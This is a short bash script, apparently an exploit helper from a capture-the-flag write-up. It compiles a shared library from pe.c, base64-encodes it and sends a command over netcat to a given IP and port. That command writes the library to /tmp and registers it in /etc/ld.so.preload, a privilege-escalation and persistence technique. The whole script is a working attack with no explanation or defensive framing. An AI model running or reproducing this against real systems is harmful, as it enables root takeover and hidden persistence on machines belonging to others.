#!/bin/bash

if [ $# -eq 1 ]; then
	ARGS=(`echo $1 | tr ':' '\n'`)
	if [ ${#ARGS[@]} -eq 2 ]; then
		gcc -fPIC -shared -nostartfiles pe.c -o pe.so
		cat pe.so | base64 > pe.enc
		echo "echo -n \"$(cat pe.enc)\" | base64 -d > /tmp/pe.so; umask 0; touch /etc/ld.so.preload; echo /tmp/pe.so > /etc/ld.so.preload; touch;" | nc ${ARGS[0]} ${ARGS[1]}
		exit 0
	fi
fi

echo "Usage: writup.sh IP:PORT"
exit 1


